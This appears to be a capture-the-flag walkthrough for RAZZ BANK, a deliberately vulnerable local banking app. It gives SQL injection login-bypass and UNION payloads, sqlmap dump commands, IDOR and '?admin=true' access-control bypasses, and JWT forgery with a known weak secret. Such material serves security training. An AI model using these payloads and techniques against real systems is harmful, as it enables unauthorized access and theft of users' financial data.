# 🏦 RAZZ BANK - The Complete Penetration Test & Challenge Write-Up

![RAZZ BANK Banner](https://github.com/KerberoSec/RAZZ_BANK/assets/188735852/491d9e79-5e58-450f-a316-c98d3d994e63)

---

## 📜 **1. Introduction & Mission Briefing**

Welcome, security analyst. This document is the official walkthrough for a full penetration test of the **RAZZ BANK** web application. RAZZ BANK is a deliberately vulnerable platform designed to simulate a real-world banking environment for advanced cybersecurity training.

**Our mission is divided into two parts:**
1.  **Primary Objective**: Breach the application's core database and exfiltrate the primary system flag. This will require exploiting the most critical vulnerability.
2.  **Secondary Objectives**: Identify and exploit all other security flaws, including insecure data exposure, privilege escalation, and weaknesses in the authentication system.

This write-up provides a meticulous, step-by-step methodology, moving from initial reconnaissance to full exploitation of all vulnerabilities.

---

## 🛠️ **2. Arsenal: Required Tools & Setup**

Before we begin, ensure your environment is set up. The application should be running via Docker as described in the `README.md`.

*   **Web Browser**: A modern browser with built-in Developer Tools (e.g., Chrome, Firefox).
*   **`curl`**: Essential for command-line interaction with web endpoints.
*   **`sqlmap`**: The industry-standard tool for automated SQL injection.
*   **A Text Editor**: For analyzing code and crafting payloads.
*   **(Optional) Burp Suite / OWASP ZAP**: An intercepting proxy is highly recommended for professionals to manipulate traffic in real-time.

---

## 🕵️‍♂️ **3. Phase I: Reconnaissance & Flag Hunting**

The first step is to gather intelligence and map the application's attack surface. During this phase, we will also begin our hunt for flags, starting with the decoys.

### 3.1. Application Exploration

Navigate to `http://localhost:5000` and begin exploring. Create a test account and log in. Analyze the functionality: dashboard, transfers, statements. Pay close attention to the URL structure and the data being exchanged in the Developer Tools' 'Network' tab.

### 3.2. The Hunt for Decoy Flags

Decoy flags are placed in common, easy-to-find locations to test an analyst's attention to detail. They are red herrings.

*   **Decoy Flag 1: Hidden in HTML Comments**
    While on the main dashboard page after logging in, view the page's HTML source (`Right-click -> View Page Source`). Often, developers leave notes or old code in comments.

    *Action*: Search the HTML for comments.
    *Result*: You might find something like this:
    `<!-- TODO: Remove this test flag before deployment. RAZZ{d3c0y_fl@g_!n_c0mm3nt} -->`

*   **Decoy Flag 2: Hardcoded in JavaScript**
    Modern web apps rely heavily on JavaScript. Let's inspect the `main.js` file.

    *Action*: Navigate to `http://localhost:5000/static/js/main.js` in your browser. Read through the code.
    *Result*: Look for hardcoded strings or variables used for testing. You may find a line like:
    `var test_api_key = "RAZZ{j@v@scr!pt_!s_n0t_s3cur3_st0r@g3}";`

*   **Decoy Flag 3: Exposed via an API Endpoint**
    The application has an API. Let's check the public status endpoint.

    *Action*: Use `curl` to query the `/api/status` endpoint.
    `curl http://localhost:5000/api/status`
    *Result*: The JSON response might contain a "message" or "motd" field with another decoy:
    `{"status": "ok", "version": "1.2", "message": "Welcome! RAZZ{w3lc0m3_t0_th3_@p!}"}`

These flags are valuable finds but are not the primary objective. The real flag requires a much deeper level of exploitation.

---

## 💣 **4. Phase II: Exploitation - Breaching the Perimeter**

Now we move from passive reconnaissance to active exploitation.

### 4.1. Vulnerability: SQL Injection (Authentication Bypass & Data Exfiltration)

The login form is our primary target for breaching the database.

#### **Step 1: Confirming the Vulnerability (Auth Bypass)**

The goal is to log in as `admin` without a password. We'll use a classic payload to manipulate the backend SQL query.

*   **Payload**: `admin' OR '1'='1' -- `
*   **Action**:
    1.  Go to the `/login` page.
    2.  In the **Username** field, enter `admin' OR '1'='1' -- `.
    3.  In the **Password** field, enter anything (e.g., `password`).
    4.  Click "Login".

*   **Result**: You are logged in as the `admin` user. This confirms a critical SQL injection vulnerability.

    *(Image placeholder: A screenshot of the login form filled with the SQLi payload, and the subsequent admin dashboard view.)*

#### **Step 2: Finding the Real Flag (Manual UNION Attack)**

This is the **Primary Objective**. We need to extract data from a hidden table called `system_flags`. We'll use a `UNION SELECT` attack. This requires knowing the number of columns in the original query. Through trial and error (using `ORDER BY`), we'd find there are 8 columns.

*   **Payload**: `x' UNION SELECT 1,2,3,flag_value,5,6,7,8 FROM system_flags-- `
*   **Action**:
    1.  Return to the `/login` page.
    2.  In the **Username** field, enter the payload above.
    3.  In the **Password** field, enter anything.
    4.  Click "Login".

*   **Result**: The application will throw an error, but the error message itself will contain the flag! The database tries to process our injected query, and the `flag_value` is returned and displayed on the screen. You should see:

    **`RAZZ{y0U_H@v3_f()UNd_$QL_!NJ3CT10N}`**

    This is the **REAL flag**. It could only be found by exploiting the SQLi vulnerability to extract data directly from the database, proving a complete system breach.

#### **Step 3: Automating with `sqlmap` (Professional Approach)**

In a real engagement, `sqlmap` automates this process.

1.  **Enumerate Databases**:
    `sqlmap -u "http://localhost:5000/login" --data="username=a&password=a" --dbs`
2.  **Enumerate Tables**:
    `sqlmap -u "http://localhost:5000/login" --data="username=a&password=a" -D main --tables`
3.  **Dump the Flag**:
    `sqlmap -u "http://localhost:5000/login" --data="username=a&password=a" -D main -T system_flags --dump`

### 4.2. Vulnerability: Insecure Direct Object Reference (IDOR)

Now we hunt for secondary vulnerabilities. IDOR allows us to access data belonging to other users.

*   **IDOR 1: Accessing User Profiles**
    *   **Endpoint**: `/profile/<user_id>`
    *   **Action**: While logged in as your test user, change the ID in the URL to another number (e.g., `1057`).
        `curl http://localhost:5000/profile/1057`
    *   **Result**: You can view the private profile information of another user.

*   **IDOR 2: Accessing Transaction Histories**
    *   **Endpoint**: `/account/<account_number>/transactions`
    *   **Action**: Guess a privileged account number, like the admin's (`ADM001`).
        `curl http://localhost:5000/account/ADM001/transactions`
    *   **Result**: A full list of the admin's financial transactions is exposed—a critical data leak.

### 4.3. Vulnerability: Authorization Bypass (Privilege Escalation)

We can escalate our privileges to gain access to the admin panel.

*   **Endpoint**: `/admin/users`
*   **Action**: This endpoint should be restricted. However, due to a flaw in the code, we can bypass the check by simply adding a URL parameter.
    `curl "http://localhost:5000/admin/users?admin=true"`
*   **Result**: The server grants access, returning a list of all users in the system. We have successfully accessed a protected administrative function.

### 4.4. Vulnerability: Weak JWT Implementation

The API uses JSON Web Tokens. Let's analyze their weakness.

*   **Action**:
    1.  Obtain a token via the API: `curl -X POST http://localhost:5000/api/auth/login -H "Content-Type: application/json" -d '{"username": "your_user", "password": "your_password"}'`
    2.  Copy the returned token and decode it at `jwt.io`.
*   **Analysis**:
    *   The `alg` is `HS256`, a symmetric algorithm.
    *   The `README.md` reveals the secret key is `weak_secret_key_2024`.
*   **Impact**: With the secret key known, an attacker can forge a token for *any* user, including the admin. They could create a token with the payload `{"user_id": 1057}` (the admin's ID), sign it with the weak secret, and use it to impersonate the admin across the entire API.

---

## 🏆 **5. Mission Debrief: Conclusion**

This penetration test was a complete success. We achieved all objectives:

*   ✅ **Primary Objective Met**: The main system flag was exfiltrated via SQL injection.
*   ✅ **Secondary Objectives Met**: We successfully identified and exploited critical IDOR, Authorization Bypass, and JWT implementation flaws.
*   ✅ **Flag Hunt Complete**: We differentiated between low-hanging decoy flags and the high-value, database-resident real flag.

The vulnerabilities discovered in RAZZ BANK are representative of common, high-impact flaws found in real-world applications. This exercise highlights the importance of secure coding practices, such as parameterized queries, robust access control checks, and strong cryptographic secrets.

**Use responsibly - Learn ethically - Secure the digital world.**